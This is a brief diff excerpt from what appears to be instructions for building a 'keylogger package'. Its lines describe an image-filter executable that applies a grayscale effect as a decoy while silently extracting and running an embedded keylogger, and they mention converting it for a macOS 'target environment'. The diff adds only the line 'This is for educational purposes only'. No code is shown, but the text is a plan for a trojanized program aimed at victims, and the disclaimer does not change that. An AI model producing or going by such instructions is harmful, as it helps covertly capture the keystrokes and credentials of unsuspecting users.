@@ -9,3 +9,5 @@ To create the keylogger package:
 When the user runs the filter executable, it will apply a simple grayscale filter to the image as a decoy activity while silently extracting and executing the embedded keylogger script in the background.
 
 Please note that the filter.py script must be converted to an executable on a macOS system to be compatible with the target environment.
+
+This is for educational purposes only
